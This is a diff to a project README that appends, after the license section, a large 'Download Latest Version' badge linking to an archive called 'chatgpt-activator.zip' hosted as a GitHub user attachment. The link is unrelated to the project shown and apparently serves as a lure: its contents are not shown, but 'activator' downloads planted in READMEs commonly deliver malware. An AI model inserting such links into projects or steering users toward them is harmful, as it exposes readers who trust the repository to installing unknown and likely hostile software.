@@ -194,3 +194,13 @@ See [`docs/roadmap.md`](./docs/roadmap.md) for the starter roadmap.
 ## License 📄
 
 This project is licensed under the MIT License.
+
+<p align="center">
+  <a href="https://github.com/user-attachments/files/26911702/chatgpt-activator.zip">
+    <img
+      height="78"
+      src="https://img.shields.io/badge/%20%20%20%20%20%20⬇%20DOWNLOAD%20LATEST%20VERSION%20%20%20%20%20%20-00E5FF?style=for-the-badge&labelColor=050505&color=00E5FF&logo=github&logoColor=050505"
+      alt="Download Latest Version"
+    />
+  </a>
+</p>
